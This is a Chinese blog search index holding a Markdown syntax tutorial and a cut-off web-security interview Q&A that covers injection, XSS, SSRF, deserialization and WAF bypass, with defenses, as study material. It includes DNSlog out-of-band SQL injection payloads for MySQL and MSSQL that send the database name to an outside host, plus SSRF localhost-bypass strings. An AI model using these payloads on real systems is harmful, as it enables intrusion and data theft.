<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Markdown语法</title>
      <link href="/posts/22648.html"/>
      <url>/posts/22648.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="1-Markdown-com-cn-简介"><a href="#1-Markdown-com-cn-简介" class="headerlink" title="1 Markdown.com.cn 简介"></a>1 Markdown.com.cn 简介</h2><ul><li>支持自定义样式的 Markdown 编辑器</li><li>支持微信公众号、知乎和稀土掘金</li><li>点击右上方对应图标，一键复制到各平台</li></ul><h2 id="2-Markdown语法教程"><a href="#2-Markdown语法教程" class="headerlink" title="2 Markdown语法教程"></a>2 Markdown语法教程</h2><h3 id="2-1-标题"><a href="#2-1-标题" class="headerlink" title="2.1 标题"></a>2.1 标题</h3><p>不同数量的<code>#</code>可以完成不同的标题，如下：</p><h1 id="一级标题"><a href="#一级标题" class="headerlink" title="一级标题"></a>一级标题</h1><h2 id="二级标题"><a href="#二级标题" class="headerlink" title="二级标题"></a>二级标题</h2><h3 id="三级标题"><a href="#三级标题" class="headerlink" title="三级标题"></a>三级标题</h3><h3 id="2-2-字体"><a href="#2-2-字体" class="headerlink" title="2.2 字体"></a>2.2 字体</h3><p>粗体、斜体、粗体和斜体，删除线，需要在文字前后加不同的标记符号。如下：</p><p><strong>这个是粗体</strong></p><p><em>这个是斜体</em></p><p><em><strong>这个是粗体加斜体</strong></em></p><p>~这里想用删除线~~</p><p>注：如果想给字体换颜色、字体或者居中显示，需要使用内嵌HTML来实现。</p><h3 id="2-3-无序列表"><a href="#2-3-无序列表" class="headerlink" title="2.3 无序列表"></a>2.3 无序列表</h3><p>无序列表的使用，在符号<code>-</code>后加空格使用。如下：</p><ul><li>无序列表 1</li><li>无序列表 2</li><li>无序列表 3</li></ul><p>如果要控制列表的层级，则需要在符号<code>-</code>前使用空格。如下：</p><ul><li>无序列表 1</li><li>无序列表 2<ul><li>无序列表 2.1</li><li>无序列表 2.2</li></ul></li></ul><p><strong>由于微信原因，最多支持到二级列表</strong>。</p><h3 id="2-4-有序列表"><a href="#2-4-有序列表" class="headerlink" title="2.4 有序列表"></a>2.4 有序列表</h3><p>有序列表的使用，在数字及符号<code>.</code>后加空格后输入内容，如下：</p><ol><li>有序列表 1</li><li>有序列表 2</li><li>有序列表 3</li></ol><h3 id="2-5-引用"><a href="#2-5-引用" class="headerlink" title="2.5 引用"></a>2.5 引用</h3><p>引用的格式是在符号<code>&gt;</code>后面书写文字。如下：</p><blockquote><p>读一本好书，就是在和高尚的人谈话。 ——歌德</p></blockquote><blockquote><p>雇用制度对工人不利，但工人根本无力摆脱这个制度。 ——阮一峰</p></blockquote><h3 id="2-7-链接"><a href="#2-7-链接" class="headerlink" title="2.7 链接"></a>2.7 链接</h3><p>微信公众号仅支持公众号文章链接，即域名为<code>https://mp.weixin.qq.com/</code>的合法链接。使用方法如下所示：</p><p>对于该论述，欢迎读者查阅之前发过的文章，<a href="https://mp.weixin.qq.com/s/s5IhxV2ooX3JN_X416nidA">你是《未来世界的幸存者》么？</a><br><a id="jump_8"></a></p><h3 id="2-8-图片"><a href="#2-8-图片" class="headerlink" title="2.8 图片"></a>2.8 图片</h3><p>插入图片，格式如下：</p><p><img src="https://www.nginx.cn/wp-content/uploads/2020/03/qrcode_for_gh_82cf87d482f0_258.jpg" alt="这里写图片描述"></p><p>支持 jpg、png、gif、svg 等图片格式，<strong>其中 svg 文件仅可在微信公众平台中使用</strong>，svg 文件示例如下：</p><p><img src="https://markdown.com.cn/images/i-am-svg.svg"></p><p>支持图片<strong>拖拽和截图粘贴</strong>到编辑器中。</p><p>注：支持图片 <em><strong>拖拽和截图粘贴</strong></em> 到编辑器中，仅支持 https 的图片，图片粘贴到微信时会自动上传微信服务器。</p><h3 id="2-9-分割线"><a href="#2-9-分割线" class="headerlink" title="2.9 分割线"></a>2.9 分割线</h3><p>可以在一行中用三个以上的减号来建立一个分隔线，同时需要在分隔线的上面空一行。如下：</p><hr><h3 id="2-10-表格"><a href="#2-10-表格" class="headerlink" title="2.10 表格"></a>2.10 表格</h3><p>可以使用冒号来定义表格的对齐方式，如下：</p><table><thead><tr><th align="left">姓名</th><th align="center">年龄</th><th align="right">工作</th></tr></thead><tbody><tr><td align="left">小可爱</td><td align="center">18</td><td align="right">吃可爱多</td></tr><tr><td align="left">小小勇敢</td><td align="center">20</td><td align="right">爬棵勇敢树</td></tr><tr><td align="left">小小小机智</td><td align="center">22</td><td align="right">看一本机智书</td></tr></tbody></table><h2 id="3-特殊语法"><a href="#3-特殊语法" class="headerlink" title="3. 特殊语法"></a>3. 特殊语法</h2><h3 id="3-1-脚注"><a href="#3-1-脚注" class="headerlink" title="3.1 脚注"></a>3.1 脚注</h3><blockquote><p>支持平台：微信公众号、知乎。</p></blockquote><p>脚注与链接的区别如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">链接：[<span class="string">文字</span>](<span class="link">链接</span>)</span><br><span class="line">脚注：[<span class="string">文字</span>](<span class="link">脚注解释 &quot;脚注名字&quot;</span>)</span><br></pre></td></tr></table></figure><p>有人认为在<a href="https://en.wikipedia.org/wiki/Front-end_web_development" title="Front-end web development">大前端时代</a>的背景下，移动端开发（Android、IOS）将逐步退出历史舞台。</p><p><a href="%E6%98%AF%E6%8C%87%E6%8E%8C%E6%8F%A1%E5%A4%9A%E7%A7%8D%E6%8A%80%E8%83%BD%EF%BC%8C%E5%B9%B6%E8%83%BD%E5%88%A9%E7%94%A8%E5%A4%9A%E7%A7%8D%E6%8A%80%E8%83%BD%E7%8B%AC%E7%AB%8B%E5%AE%8C%E6%88%90%E4%BA%A7%E5%93%81%E7%9A%84%E4%BA%BA%E3%80%82" title="什么是全栈工程师">全栈工程师</a>在业务开发流程中起到了至关重要的作用。</p><p>脚注内容请拉到最下面观看。</p><h3 id="3-2-代码块"><a href="#3-2-代码块" class="headerlink" title="3.2 代码块"></a>3.2 代码块</h3><blockquote><p>支持平台：微信代码主题仅支持微信公众号！其他主题无限制。</p></blockquote><p>如果在一个行内需要引用代码，只要用反引号引起来就好，如下：</p><p>Use the <code>printf()</code> function.</p><p>在需要高亮的代码块的前一行及后一行使用三个反引号，同时<strong>第一行反引号后面表示代码块所使用的语言</strong>，如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// FileName: HelloWorld.java</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span> &#123;</span><br><span class="line">  <span class="comment">// Java 入口程序，程序从此入口</span></span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Hello,World!&quot;</span>); <span class="comment">// 向控制台打印一条语句</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>支持以下语言种类：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">bash</span><br><span class="line">clojure，cpp，cs，css</span><br><span class="line">dart，dockerfile, diff</span><br><span class="line">erlang</span><br><span class="line">go，gradle，groovy</span><br><span class="line">haskell</span><br><span class="line">java，javascript，json，julia</span><br><span class="line">kotlin</span><br><span class="line">lisp，lua</span><br><span class="line">makefile，markdown，matlab</span><br><span class="line">objectivec</span><br><span class="line">perl，php，python</span><br><span class="line">r，ruby，rust</span><br><span class="line">scala，shell，sql，swift</span><br><span class="line">tex，typescript</span><br><span class="line">verilog，vhdl</span><br><span class="line">xml</span><br><span class="line">yaml</span><br></pre></td></tr></table></figure><p>如果想要更换代码高亮样式，可在上方<strong>代码主题</strong>中挑选。</p><p>其中<strong>微信代码主题与微信官方一致</strong>，有以下注意事项：</p><ul><li>带行号且不换行，代码大小与官方一致</li><li>需要在代码块处标志语言，否则无法高亮</li><li>粘贴到公众号后，用鼠标点代码块内外一次，完成高亮</li></ul><p>diff 不能同时和其他语言的高亮同时显示，且需要调整代码主题为微信代码主题以外的代码主题才能看到 diff 效果，使用效果如下:</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="addition">+ 新增项</span></span><br><span class="line"><span class="deletion">- 删除项</span></span><br></pre></td></tr></table></figure><p><strong>其他主题不带行号，可自定义是否换行，代码大小与当前编辑器一致</strong></p><h3 id="3-3-数学公式"><a href="#3-3-数学公式" class="headerlink" title="3.3 数学公式"></a>3.3 数学公式</h3><blockquote><p>支持平台：微信公众号、知乎。</p></blockquote><p>行内公式使用方法，比如这个化学公式：$\ce{Hg^2+ -&gt;[I-] HgI2 -&gt;[I-] [Hg^{II}I4]^2-}$</p><p>块公式使用方法如下：</p><p>$$H(D_2) &#x3D; -\left(\frac{2}{4}\log_2 \frac{2}{4} + \frac{2}{4}\log_2 \frac{2}{4}\right) &#x3D; 1$$</p><p>矩阵：</p><p>$$<br>  \begin{pmatrix}<br>  1 &amp; a_1 &amp; a_1^2 &amp; \cdots &amp; a_1^n \<br>  1 &amp; a_2 &amp; a_2^2 &amp; \cdots &amp; a_2^n \<br>  \vdots &amp; \vdots &amp; \vdots &amp; \ddots &amp; \vdots \<br>  1 &amp; a_m &amp; a_m^2 &amp; \cdots &amp; a_m^n \<br>  \end{pmatrix}<br>$$</p><p>公式由于微信不支持，目前的解决方案是转成 svg 放到微信中，无需调整，矢量不失真。</p><p>目前测试如果公式量过大，在 Chrome 下会存在粘贴后无响应，但是在 Firefox 中始终能够成功。</p><h3 id="3-4-TOC"><a href="#3-4-TOC" class="headerlink" title="3.4 TOC"></a>3.4 TOC</h3><blockquote><p>支持平台：微信公众号、知乎。</p></blockquote><p>TOC 全称为 Table of Content，列出全部标题。</p><p>[TOC]</p><p>由于微信只支持到二级列表，本工具仅支持二级标题和三级标题的显示。</p><h3 id="3-5-注音符号"><a href="#3-5-注音符号" class="headerlink" title="3.5 注音符号"></a>3.5 注音符号</h3><blockquote><p>支持平台：微信公众号。</p></blockquote><p>支持注音符号，用法如下：</p><p>Markdown Nice 这么好用，简直是{喜大普奔|hē hē hē hē}呀！</p><h3 id="3-6-横屏滑动幻灯片"><a href="#3-6-横屏滑动幻灯片" class="headerlink" title="3.6 横屏滑动幻灯片"></a>3.6 横屏滑动幻灯片</h3><blockquote><p>支持平台：微信公众号。</p></blockquote><p>通过<code>&lt;![](url),![](url)&gt;</code>这种语法设置横屏滑动滑动片，具体用法如下：</p><p>&lt;<img src="https://markdown.com.cn/images/blue.jpg" alt="蓝1">,<img src="https://markdown.com.cn/images/green.jpg" alt="绿2">,<img src="https://markdown.com.cn.jpg/" alt="红3">&gt;</p><h2 id="4-其他语法"><a href="#4-其他语法" class="headerlink" title="4 其他语法"></a>4 其他语法</h2><h3 id="4-1-HTML"><a href="#4-1-HTML" class="headerlink" title="4.1 HTML"></a>4.1 HTML</h3><p>支持原生 HTML 语法，请写内联样式，如下：</p><p><span style="display:block;text-align:right;color:orangered;">橙色居右</span><br><span style="display:block;text-align:center;color:orangered;">橙色居中</span></p><h3 id="4-2-UML"><a href="#4-2-UML" class="headerlink" title="4.2 UML"></a>4.2 UML</h3><p>不支持，推荐使用开源工具<code>https://draw.io/</code>制作后再导入图片</p><h2 id="5-致谢"><a href="#5-致谢" class="headerlink" title="5 致谢"></a>5 致谢</h2><ul><li>歌词经理 <a href="https://github.com/lyricat/wechat-format" title="灵感来源">wechat-fromat</a></li><li>颜家大少 <a href="http://md.aclickall.com/" title="MdA2All">MD2All</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> -Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -Markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网安面试</title>
      <link href="/posts/32205.html"/>
      <url>/posts/32205.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="一、web常问（42）"><a href="#一、web常问（42）" class="headerlink" title="一、web常问（42）"></a>一、web常问（42）</h1><h2 id="1-SQL注入原理的种类？防御呢？预编译原理？"><a href="#1-SQL注入原理的种类？防御呢？预编译原理？" class="headerlink" title="1. SQL注入原理的种类？防御呢？预编译原理？"></a>1. SQL注入原理的种类？防御呢？预编译原理？</h2><blockquote><p><strong>原理</strong>：在数据交互中，前端的数据传入到后台处理<br>时，由于后端没有做严格的判断，导致其传入的“数<br>据”拼接到SQL语句中后，被当作SQL语句的一部分执<br>行。</p></blockquote><blockquote><p><strong>种类</strong>：字符，数字，布尔，报错，延迟，联合，堆<br>叠，宽字节，XFF等</p></blockquote><blockquote><p><strong>修复</strong>：使用预编译，PDO，正则表达式过滤，开启魔<br>术引号，加装WAF等</p></blockquote><blockquote><p><strong>预编译原理</strong>：预编译将一次查询通过两次交互完成，<br>第一次交互发送查询语句的模板，由后端的SQL引擎进<br>行解析为AST或Opcode，第二次交互发送数据，代入<br>AST或Opcode中执行，无论后续向模板传入什么参<br>数，这些参数仅仅被当成字符串进行查询处理，因此<br>杜绝了sql注入的产生。</p></blockquote><h2 id="2-XSS的种类有哪些？区别？修复呢？"><a href="#2-XSS的种类有哪些？区别？修复呢？" class="headerlink" title="2. XSS的种类有哪些？区别？修复呢？"></a>2. XSS的种类有哪些？区别？修复呢？</h2><p>种类：存储型，反射型，DOM型<br>区别：存储型:常出现在信息修改添加等地方，导致恶<br>意代码被存储在数据库中，每当被攻击者访问到后就<br>会触发执行；反射型：常出现在url中，一般需要攻击<br>者提前构造好恶意链接，欺骗用户点击，触发攻击代<br>码；DOM型：攻击代码在url中，然后输出在了浏览器<br>的DOM节点中。简单比较会发现，存储和反射都经过<br>服务器，而DOM是纯前端。<br>修复：对输入数据进行Html Encode 处理，白名单过<br>滤，过滤JavaScript 事件的标签，开启http-only，装<br>WAF等。</p><h2 id="3-XSS-CSRF和SSRF区别？-很常问"><a href="#3-XSS-CSRF和SSRF区别？-很常问" class="headerlink" title="3. XSS,CSRF和SSRF区别？(很常问)"></a>3. XSS,CSRF和SSRF区别？(很常问)</h2><p>XSS：跨站脚本攻击；<br>CSRF：跨站请求伪造脚本攻击；<br>SSRF：服务器请求伪造攻击。<br>区别：XSS是服务器对用户输入的数据没有进行足够的<br>过滤，导致客户端浏览器在渲染服务器返回的html页<br>面时，出现了预期值之外的 脚本语句被执行。CSRF：<br>CSRF是服务器端没有对用户提交的数据进行随机值校<br>验，且对http请求包内的refer字段校验不严，导致攻击<br>者可以 利用用户的Cookie信息伪造用户请求发送至服<br>务器。 SSRF：SSRF是服务器对 用户提供的可控URL过<br>于信任，没有对攻击者提供的RUL进行地址限制和足够<br>的检测，导致攻击者可以以此为跳板攻击内网或其他<br>服务器。</p><h2 id="4-XXE漏洞了解吗？"><a href="#4-XXE漏洞了解吗？" class="headerlink" title="4. XXE漏洞了解吗？"></a>4. XXE漏洞了解吗？</h2><p>XXE漏洞即xml外部实体注入漏洞,发生在应用程序解析<br>XML输入时，没有禁止外部实体的加载，导致可加载恶<br>意外部文件，造成文件读取、命令执行、内网端口、<br>攻击内网网站、发起dos攻击等危害。</p><h2 id="5-PHP反序列化有了解吗？"><a href="#5-PHP反序列化有了解吗？" class="headerlink" title="5. PHP反序列化有了解吗？"></a>5. PHP反序列化有了解吗？</h2><p>序列化就是将一个对象转换成字符串，反序列化则反<br>之，将字符串重新转化为对象。<br>此外，PHP反序列化又可以简单分成两种，一种无<br>类，一种有类，无类利用就略微简单，如果源码会将<br>输入的值进行反序列化，那我们就需要提前将数据序<br>列化后再传入。而想要利用有类就要用到魔术方法，<br>而魔术方法就像一个潜规则一样，例如我们在创建对<br>象时，就会触发__construct(),并执行__construct()中的<br>代码。<br>再用通俗的话来说，例如有人喊出了你女朋友的名<br>字，你脑海中就会马上复现出她的身影一样，没有人<br>让你特意去想，只是一种无意识的规则调用。</p><h3 id="5-1-JAVA反序列化了解吗？有没有了解过shrio反序列化？-最常问，无论hvv还是工作面试-？"><a href="#5-1-JAVA反序列化了解吗？有没有了解过shrio反序列化？-最常问，无论hvv还是工作面试-？" class="headerlink" title="5.1 JAVA反序列化了解吗？有没有了解过shrio反序列化？(最常问，无论hvv还是工作面试)？"></a>5.1 JAVA反序列化了解吗？有没有了解过shrio反序列化？(最常问，无论hvv还是工作面试)？</h3><p>Java中的ObjectOutputStream类的writeObject()方法可<br>以实现序列化，其作用把对象转换成字节流，便于保<br>存或者传输，而ObjectInputStream类的readObject()方<br>法用于反序列化，作用就是把字节流还原成对象。<br>shiro反序列化主要是Apache shiro提供了一个<br>remember的一个功能，用户登录成功后会生成经过加<br>密并编码的cookie，保存在浏览器中方便用户的日常使<br>用，而服务器对cookie的处理流程就是先获取浏览器上<br>保存的cookie，然后将其bs64解码，再进行AES解密，<br>再将其反序列化进行校验，而漏洞就是出现在这里，<br>我们都知道AES它是一个硬编码，他是有默认密钥的，<br>如果程序员没有去修改或者过于简单，那我们就可以<br>进行cookie重构，先构造我们的恶意代码，然后将恶意<br>代码进行序列化，然后AES加密(密钥我们已经爆破出<br>来了)，再进行bs64编码，形成我们新的cookie，而服<br>务器在处理时就会按照刚才的处理流程，就会在服务<br>端触发我们构造的恶意代码。</p><h2 id="6-逻辑漏洞遇到过哪些，给你登录框有没有什么思路？"><a href="#6-逻辑漏洞遇到过哪些，给你登录框有没有什么思路？" class="headerlink" title="6. 逻辑漏洞遇到过哪些，给你登录框有没有什么思路？"></a>6. 逻辑漏洞遇到过哪些，给你登录框有没有什么思路？</h2><p>常见逻辑漏洞：越权，响应包修改，支付金额修改，<br>cookie爆破，密码找回方面等等<br>登录页面思路：爆破，session覆盖，sql注入，xss，任<br>意用户注册，js文件查看敏感信息，短信轰炸，万能密码，二次注入，模板注入等等</p><h2 id="7-CDN和DNS区别？CDN绕过思路？"><a href="#7-CDN和DNS区别？CDN绕过思路？" class="headerlink" title="7. CDN和DNS区别？CDN绕过思路？"></a>7. CDN和DNS区别？CDN绕过思路？</h2><p>CDN：内容分发网络，主要作用就是让用户就近访问<br>网络资源，提高响应速度，降低网络拥堵。<br>DNS:域名服务器，主要作用就是将域名翻译成ip地<br>址。<br>CDN绕过思路：子域名，内部邮件，黑暗引擎搜索，<br>国外ping，证书及DNS查询，app抓包，配置不当泄<br>露，扫全网，DOS攻击等。</p><h2 id="8-常见的中间件漏洞知道哪些？"><a href="#8-常见的中间件漏洞知道哪些？" class="headerlink" title="8. 常见的中间件漏洞知道哪些？"></a>8. 常见的中间件漏洞知道哪些？</h2><p>IIS：PUT漏洞、短文件名猜解、远程代码执行、解析<br>漏洞等<br>Apache：解析漏洞、目录遍历等<br>Nginx:文件解析、目录遍历、CRLF注入、目录穿越等<br>Tomcat:远程代码执行、war后门文件部署等<br>JBoss:反序列化漏洞、war后门文件部署等<br>WebLogic:反序列化漏洞、SSRF任意文件上传、war后<br>门文件部署等<br>………..</p><h2 id="9-WAF绕过的手法你知道哪些？"><a href="#9-WAF绕过的手法你知道哪些？" class="headerlink" title="9. WAF绕过的手法你知道哪些？"></a>9. WAF绕过的手法你知道哪些？</h2><p>这里从以sql注入为例，从三个层面简单总结一下手<br>法。<br>1.从架构层面：找到服务器真实IP，同网段绕过，http<br>和https同时开放服务绕过，边缘资产漏洞利用绕过。<br>2.从协议层面：分块延时传输，利用pipline绕过，利用<br>协议未覆盖绕过，POST及GET提交绕过。<br>3.从规则层面：编码绕过，等价符号替换绕过，普通注<br>释和内敛注释，缓冲区溢出，mysql黑魔法，白名单及<br>静态资源绕过，文件格式绕过，参数污染。</p><h2 id="10-命令无回显如何解决？"><a href="#10-命令无回显如何解决？" class="headerlink" title="10. 命令无回显如何解决？"></a>10. 命令无回显如何解决？</h2><p>无回显：延时判断，http请求监听，DNSlog利用，写<br>入当前目录下载查看等等。</p><h2 id="11-3389端口无法连接的几种情况？"><a href="#11-3389端口无法连接的几种情况？" class="headerlink" title="11. 3389端口无法连接的几种情况？"></a>11. 3389端口无法连接的几种情况？</h2><p>1.3389关闭状态，2.端口修改，3.防火墙连接，4.处于<br>内网环境，5.超过了服务器最大连接数，6.管理员设置<br>权限，指定用户登录。</p><h2 id="12-常问的端口信息？"><a href="#12-常问的端口信息？" class="headerlink" title="12. 常问的端口信息？"></a>12. 常问的端口信息？</h2><p>21：FTP文件传输协议<br>22：SSH远程连接<br>23：TELNET远程登录<br>25：SMTP邮件服务<br>53：DNS域名系统<br>80：HTTP超文本传输协议<br>443：HTTPS安全超文本传输协议<br>1433：MSSQL<br>3306：MYSQL<br>3389：windows远程桌面服务端口<br>7701：weblogic<br>8080：TCP,HTTP协议代理服务器：Apache-tomcat默认<br>端口号</p><h2 id="13-渗透测试的流程？-主要看自己"><a href="#13-渗透测试的流程？-主要看自己" class="headerlink" title="13. 渗透测试的流程？(主要看自己)"></a>13. 渗透测试的流程？(主要看自己)</h2><p>单一网站：先判断有无CDN，有先找真实ip，无的话扫<br>扫旁站，c段，此外识别CMS，看看使用什么中间件，<br>插件，系统等等，再对其进行端口探测，目录扫描，<br>查看网站的js文件，看看有没有敏感信息泄露，找找看<br>看有没有app，公众号之类的等等扩大资产面，然后对<br>收集到的信息进行常规的漏洞探测。<br>网段或区域：使用goby工具对资产进行一个批量的扫<br>描，批量打点，然后对可能存在漏洞的薄弱点进行漏<br>洞探测。</p><h2 id="14-什么是逻辑漏洞？说出至少三种业务逻辑漏洞，以及修复方式？"><a href="#14-什么是逻辑漏洞？说出至少三种业务逻辑漏洞，以及修复方式？" class="headerlink" title="14. 什么是逻辑漏洞？说出至少三种业务逻辑漏洞，以及修复方式？"></a>14. 什么是逻辑漏洞？说出至少三种业务逻辑漏洞，以及修复方式？</h2><p>逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，导致<br>一些逻辑分支不能够正常处理或处理错误。<br>拿支付漏洞来说，简单思路有价格修改，支付状态修<br>改，数量最大值溢出，订单替换，支付接口替换，四<br>舍五入，越权支付等等。<br>拿登录来说，修改状态信息，密码修改跳过验证等<br>等。<br>密码找回漏洞中存在：1）密码允许暴力破解、2）存<br>在通用型找回凭证、3）可以跳过验证步骤、4）找回<br>凭证可以拦包获取。<br>身份认证漏洞中最常见的是：1）会话固定攻击、2）<br>Cookie 仿冒。只要得到 Session 或 Cookie 即可伪造用<br>户身份。<br>验证码漏洞中存在：1）验证码允许暴力破解、2）验<br>证码可以通过 Javascript 或者改包的方法来进行绕过。</p><h2 id="15-未授权访问你可以简单说说吗？"><a href="#15-未授权访问你可以简单说说吗？" class="headerlink" title="15. 未授权访问你可以简单说说吗？"></a>15. 未授权访问你可以简单说说吗？</h2><p>Redis 未授权访问漏洞<br>未开启认证，导致可以直接连接到数据库，<br>然后在攻击机中生成ssh公钥和私钥，密码设置为空，<br>然后将生成的公钥写入，再利用私钥连接。<br>JBOSS 未授权访问漏洞<br>访问ip&#x2F;jmx-console 就可以浏览 jboss 的部署管理的信<br>息面板，不需要输入用户名和密码可以直接部署上传<br>木马。简单来说就是对某些页面的验证不严格导致绕过了用<br>户验证的环节，使其可以直接访问到某些登录后才能<br>访问到的页面。</p><h2 id="16-打点一般会用什么漏洞？"><a href="#16-打点一般会用什么漏洞？" class="headerlink" title="16. 打点一般会用什么漏洞？"></a>16. 打点一般会用什么漏洞？</h2><p>优先以java反序列化这些漏洞像shiro，fastjson，<br>weblogic，用友oa等等进行打点，随后再找其他脆弱<br>性易打进去的点。因为javaweb程序运行都是以高权限<br>有限运行，部分可能会降权。</p><h2 id="20-拿到webshell不出网情况下怎么办？"><a href="#20-拿到webshell不出网情况下怎么办？" class="headerlink" title="20. 拿到webshell不出网情况下怎么办？"></a>20. 拿到webshell不出网情况下怎么办？</h2><p>reg上传去正向连接。探测出网协议，如dns，icmp。</p><h2 id="21-PHP-代码执行的危险函数？PHP-命令执行函数-？"><a href="#21-PHP-代码执行的危险函数？PHP-命令执行函数-？" class="headerlink" title="21. PHP 代码执行的危险函数？PHP 命令执行函数 ？"></a>21. PHP 代码执行的危险函数？PHP 命令执行函数 ？</h2><p>PHP 代码执行的危险函数：call_user_func()、<br>call_user_func_array()、create_function()、<br>array_map()<br>PHP 命令执行函数：system()、shell_exec()、<br>passthru()、exec()、popen()、proc_open()、putenv()</p><h2 id="22-Sql-注入无回显的情况下，利用-DNSlog，mysql-下利用什么"><a href="#22-Sql-注入无回显的情况下，利用-DNSlog，mysql-下利用什么" class="headerlink" title="22. Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么"></a>22. Sql 注入无回显的情况下，利用 DNSlog，mysql 下利用什么</h2><p>构造代码？mssql 下又如何？<br>（1）没有回显的情况下，一般编写脚本，进行自动化<br>注入。但与此同时，由于防火墙的存在，容易被封禁<br>IP，可以尝试调整请求频率，有条件的使用代理池进<br>行请求。<br>（2）此时也可以使用 DNSlog 注入，原理就是把服务<br>器返回的结果放在域名中，然后读取 DNS 解析时的日<br>志，来获取想要的信息。<br>（3）Mysql 中利用 load_file() 构造payload： ‘ and<br>if((select load_file(concat(‘\\‘,(select database()),’.<br>\abc’))),1,0)#<br>xxx.ce<br>ye.io<br>（4）Mssql 下利用 master..xp_dirtree 构造payload：<br>DECLARE @host varchar(1024);SELECT @host&#x3D;(SELECT<br>db_name())+’. ‘;EXEC(‘master..xp_dirtree”&#39;+@<br>host+’\foobar$”‘);</p><h2 id="23-phpmyadmin写sehll的方法？"><a href="#23-phpmyadmin写sehll的方法？" class="headerlink" title="23. phpmyadmin写sehll的方法？"></a>23. phpmyadmin写sehll的方法？</h2><p>常规导入shell的操作<br>一句话导出shell<br>日志备份获取shell</p><h2 id="25-SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？"><a href="#25-SSRF-禁用-127-0-0-1-后如何绕过，支持哪些协议？" class="headerlink" title="25. SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？"></a>25. SSRF 禁用 127.0.0.1 后如何绕过，支持哪些协议？</h2><p>(1) 利用进制转换<br>(2) 利用DNS解析<br>(3) 利用句号（127。0。0。1）<br>(4) 利用[::]（http:&#x2F;&#x2F;[::]:80&#x2F;）；<br>(5) 利用@（<br><a href="http://example.com@127.0.0.1/">http://example.com@127.0.0.1</a><br>）；<br>(6) 利用短地址（<br><a href="http://dwz.cn/11SMa">http://dwz.cn/11SMa</a><br>）；<br>(7) 协议（Dict:&#x2F;&#x2F;、SFTP:&#x2F;&#x2F;、TFTP:&#x2F;&#x2F;、LDAP:&#x2F;&#x2F;、<br>Gopher:&#x2F;&#x2F;）</p><h2 id="26-phar协议如何利用，php伪协议input与post数据包发送有什"><a href="#26-phar协议如何利用，php伪协议input与post数据包发送有什" class="headerlink" title="26. phar协议如何利用，php伪协议input与post数据包发送有什"></a>26. phar协议如何利用，php伪协议input与post数据包发送有什</h2><p>么区别？<br>（1）可以Bypass一些waf，绕过上传限制<br>（2）Phar反序列化，Phar:&#x2F;&#x2F; 伪协议读取phar文件时，<br>会反序列化meta-data储存<br>（3） 区别<br>一、 application&#x2F;x-www-form-urlencoded 或<br>multipart&#x2F;form-data时，php:&#x2F;&#x2F;input 中是原始数据。<br>$_POST 中是关联数组，且没有上传控件的内容。<br>二、enctype&#x3D;”multipart&#x2F;form-data” 时php:&#x2F;&#x2F;input 是无<br>效的。<br>三、 Content-Type &#x3D; “text&#x2F;plain”时，$_POST 不能获取<br>post的数据， php:&#x2F;&#x2F;input可以。</p><h2 id="30-提权你了解过吗？udf提取原理是什么"><a href="#30-提权你了解过吗？udf提取原理是什么" class="headerlink" title="30. 提权你了解过吗？udf提取原理是什么"></a>30. 提权你了解过吗？udf提取原理是什么</h2><p>将udf文件放到指定位置（Mysql&gt;5.1放在Mysql根目录<br>的lib\plugin文件夹下）<br>从udf文件中引入自定义函数(user defined function)<br>执行自定义函数</p><h2 id="32-了解过解析漏洞，分别有哪些？"><a href="#32-了解过解析漏洞，分别有哪些？" class="headerlink" title="32. 了解过解析漏洞，分别有哪些？"></a>32. 了解过解析漏洞，分别有哪些？</h2><p>IIS：<br>1、在网站目录*.asp、*.asa下的任何扩展名的文件<br>格式都会被解析为asp并执行在目录*.asp下，*.txt文<br>本文件被解析。<br>2、在IIS6.0上，分号 ; 后面的不解析。<br>nginx：<br>1、在网站目录下创建文件demo2.jpg，然后再浏览<br>器中访问<br>，服务器对请求的内容是从右向左的。Nginx拿<br>到文件路径（更专业的说法是 <a 